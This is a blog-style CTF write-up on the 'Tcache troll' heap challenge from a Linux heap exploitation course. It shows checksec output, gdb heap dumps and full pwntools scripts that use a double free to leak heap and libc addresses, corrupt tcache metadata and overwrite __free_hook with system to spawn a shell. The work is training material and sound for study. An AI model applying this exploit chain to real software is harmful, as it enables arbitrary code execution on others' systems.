---
layout: post
title:  "Tcache troll"
date:   2024-03-23 20:01:22 +0100
categories: jekyll update
---
Tcache troll is ctf style challenge binary from wonderful udemy course "Linux Heap Exploitation".
Our goal is to exploit this binary to get shell.
Let's start with checking enabled protections:
{% highlight ruby %}
ady@heap-lab:~/heaplab2/challenge-tcache_troll$ checksec tcache_troll
[*] '/home/ady/heaplab2/challenge-tcache_troll/tcache_troll'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'../.glibc/glibc_2.28'
{% endhighlight %}

Important things to note:
1. ASLR and NX enabled
2. glibc version 2.28 means tcache is enabled, but without double free protection

ASLR (address space layout randomization) means that program sections such as heap, stack, etc load address would be randomized. It makes our job slightly harder, because we cannot rely on any hardcoded addresses.

Challenge name together with glibc version used suggest that attack like tcache dup would be useful. Let's keep that in mind and explore what challenge bin gives us.
After starting challenge binary we are greeted by this menu:
{% highlight console %}
ady@heap-lab:~/heaplab2/challenge-tcache_troll$ ./tcache_troll 

===============
|   HeapLAB   |  CHALLENGE: Tcache Troll
===============

1) malloc 0/8
2) free 0/5
3) read
4) quit
{% endhighlight %}

Options are pretty self explanatory:
Malloc uses glibc malloc to allocate up to 1024 bytes of memory and copy provided data into it. Address returned by malloc is saved and can be used by other functions (each alloc get next index starting from zero)
Free deallocate selected chunk by idx.
Read reads 8 bytes of memory by idx.

Finding bug was fairly easy - program doesn't check for double free allowing us to free same memory multiple times. As mentioned before this allows us to use attack such as tcache dup to get arbitrary code execution. Because target was compiled with ASLR we need to leak libc address, so we could 'call' libc functions, such as system.
My first idea was to somehow dup chunk linked into unsorted bin and read fwd pointer to main arena. That wasn't possible due to tcache and limited amount of calls to free. With only 5 calls we are unable to use all 7 tcache slots to free chunk into.

After some pondering I remembered that tcache metadata, including number of allocated block for given size is kept on heap (in first 0x250 bytes sized chunk).
What if we overwrite size field so chosen slot will look like filled. Next deallocation should avoid tcache and be linked into other bin.

So plan of attack looks like this:
1. Leak heap address
2. Overwrite tcache metadata to convince glibc that specific tcache slot is full, then free duplicated chunk into unsorted_bin, leaking libc address
3. Use tcache dup to overwrite __free_hook with system then free chunk with `/bin/sh\0` to get shell

Let's start with step 1:
First let's allocate and free two 0x20 sized chunk, then look into heap with gdb:
{% highlight bash %}
pwndbg> vis

0x563bcc836000	0x0000000000000000	0x0000000000000251	........Q.......
0x563bcc836010	0x0000000000000002	0x0000000000000000	................
0x563bcc836020	0x0000000000000000	0x0000000000000000	................
0x563bcc836030	0x0000000000000000	0x0000000000000000	................
0x563bcc836040	0x0000000000000000	0x0000000000000000	................
0x563bcc836050	0x0000563bcc836280	0x0000000000000000	.b..;V..........
0x563bcc836060	0x0000000000000000	0x0000000000000000	................
0x563bcc836070	0x0000000000000000	0x0000000000000000	................
0x563bcc836080	0x0000000000000000	0x0000000000000000	................
0x563bcc836090	0x0000000000000000	0x0000000000000000	................
0x563bcc8360a0	0x0000000000000000	0x0000000000000000	................
0x563bcc8360b0	0x0000000000000000	0x0000000000000000	................
0x563bcc8360c0	0x0000000000000000	0x0000000000000000	................
0x563bcc8360d0	0x0000000000000000	0x0000000000000000	................
0x563bcc8360e0	0x0000000000000000	0x0000000000000000	................
0x563bcc8360f0	0x0000000000000000	0x0000000000000000	................
0x563bcc836100	0x0000000000000000	0x0000000000000000	................
0x563bcc836110	0x0000000000000000	0x0000000000000000	................
0x563bcc836120	0x0000000000000000	0x0000000000000000	................
0x563bcc836130	0x0000000000000000	0x0000000000000000	................
0x563bcc836140	0x0000000000000000	0x0000000000000000	................
0x563bcc836150	0x0000000000000000	0x0000000000000000	................
0x563bcc836160	0x0000000000000000	0x0000000000000000	................
0x563bcc836170	0x0000000000000000	0x0000000000000000	................
0x563bcc836180	0x0000000000000000	0x0000000000000000	................
0x563bcc836190	0x0000000000000000	0x0000000000000000	................
0x563bcc8361a0	0x0000000000000000	0x0000000000000000	................
0x563bcc8361b0	0x0000000000000000	0x0000000000000000	................
0x563bcc8361c0	0x0000000000000000	0x0000000000000000	................
0x563bcc8361d0	0x0000000000000000	0x0000000000000000	................
0x563bcc8361e0	0x0000000000000000	0x0000000000000000	................
0x563bcc8361f0	0x0000000000000000	0x0000000000000000	................
0x563bcc836200	0x0000000000000000	0x0000000000000000	................
0x563bcc836210	0x0000000000000000	0x0000000000000000	................
0x563bcc836220	0x0000000000000000	0x0000000000000000	................
0x563bcc836230	0x0000000000000000	0x0000000000000000	................
0x563bcc836240	0x0000000000000000	0x0000000000000000	................
0x563bcc836250	0x0000000000000000	0x0000000000000021	........!.......
0x563bcc836260	0x0000000000000000	0x0000000000000000	................	 <-- tcachebins[0x20][1/2]
0x563bcc836270	0x0000000000000000	0x0000000000000021	........!.......
0x563bcc836280	0x0000563bcc836260	0x0000000000000000	`b..;V..........	 <-- tcachebins[0x20][0/2]
0x563bcc836290	0x0000000000000000	0x0000000000020d71	........q.......	 <-- Top chunk
{% endhighlight %}

We see chunk containing tcache at top of heap at address 0x563bcc836000. Next are bins sizes, one byte per bin.
At 0x563bcc836000 lies 0x20 sized bin - it contains ptr to first free chunk in that bin, which in turn points to next free chunk,
forming linked list of free chunks.

If we free same chunk twice and then allocate new one with same size it will be allocated from tcache, but still considered part of tcache fwd list.
After freeing it again, libc will link it into list, writing fwd ptr to itself into it's user data.
Because it's duplicated and we freed only one end, we can use other to read it, leaking heap address :)

Following pwntools scripts shows that:
{% highlight python %}
dup = malloc(0x18, b"A"*8)
free(dup)
free(dup)

leak = malloc(0x18, b"B"*8)
free(dup)

heap = u64(read(leak)) - 0x260 # 0x10 bytes of chunk header + 0x250 byets of tcache chunk
log.info(f"heap addr - 0x{heap:x}")
{% endhighlight %}

That gives us heap addr:
{% highlight console %}
...
[*] heap addr - 0x556eba5d0000
...
{% endhighlight %}

We can verify that with gdb:
{% highlight console %}
pwndbg> vmmap 0x556eba5d0000
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x556eb9202000     0x556eb9203000 rw-p     1000   2000 /home/ady/heaplab2/challenge-tcache_troll/tcache_troll
►   0x556eba5d0000     0x556eba5f1000 rw-p    21000      0 [heap] +0x0
    0x7fb97920b000     0x7fb9793b7000 r-xp   1ac000      0 /home/ady/heaplab2/.glibc/glibc_2.28/libc-2.28.so
{% endhighlight %}

Step 2:
We can keep using our duplicated chunk to perform tcache dup attack - we allocate new chunk and set it data to target we want to overwrite.
Next allocation will unlink our chunk from tcache list, treating our data as fwd ptr and writing it to head of bin.
Succeeding allocation will be served from that bin, giving us chunk starting at target data - we can use it to set size field of 0x90 bin to 7 (which means that bin is full)
After that we just need to free chunk and it will avoid tcache and be linked into unsorted bin - it's first qword will contain address of bin in main_arena. We can use it to calculate libc address.

Also we had to add guard chunk before dup chunk, to avoid consolidation with top chunk and change chunk sizes to 0x90, so it will be freed into unsorted bin instead of fastbin.

{% highlight python %}
dup = malloc(0x88, b"A"*8)
guard = malloc(0x18, b"G"*8)
free(dup)
free(dup)

leak = malloc(0x88, b"C"*8)
free(dup)
heap = u64(read(leak)) - 0x260
log.info(f"heap @ 0x{heap:x}")

#tcache dup
malloc(0x88, pack(heap+0x10)) #target addr
malloc(0x88, "YYYY")
malloc(0x88, p8(0)*7 + p8(7)) #served from target, overwriting size field

free(dup)

unsortedbin = u64(read(leak))
unsorted_offset = libc.sym.main_arena + 0x58 + 0x8
libc.address = unsortedbin - unsorted_offset
log.info(f"libc @ 0x{libc.address:x}")
{% endhighlight  %}


Step 3:
At this point it should be easy to wrap things up - just use tcache dup again to overwrite libc._free_hook.
Unfortunately at this point we have one call to free and two to malloc - not enough for this attack.

Instead we could use our write to tcache metadata. We can write fake ptr into bin, and allocate from it, getting chunk overlapping address we want to write to.
The only problem is that we don't have libc address at that time, but we can setup another overwrite into other tcache bin (let's say 0x20) and then allocate from it after getting libc address.
Rest is fairly simple - we can use that write address of libc.system into libc.__free_hook. Next call free on chunk with "/bin/sh\0" data gets us shell.

Following pwntools scripts wraps everything up:
{% highlight python %}
dup = malloc(0x88, b"A"*8)
guard = malloc(0x18, "/bin/sh\0")
free(dup)
free(dup)

leak = malloc(0x88, "C")
free(dup)
heap = u64(read(leak)) - 0x260
log.info(f"heap @ 0x{heap:02x}")

malloc(0x88, pack(heap+0x10))
malloc(0x88, "YYYY")
malloc(0x88, p8(0)*7 + p8(7) + p8(0)*56 + pack(0) * 7 + pack(heap+0x50))

free(dup)

unsortedbin = u64(read(leak))
unsorted_offset = libc.sym.main_arena + 0x58 + 0x8
libc.address = unsortedbin - unsorted_offset
log.info(f"libc @ 0x{libc.address:02x}")

malloc(0x88, pack(libc.sym.__free_hook))
malloc(0x18, pack(libc.sym.system))
free(guard)
{% endhighlight  %}
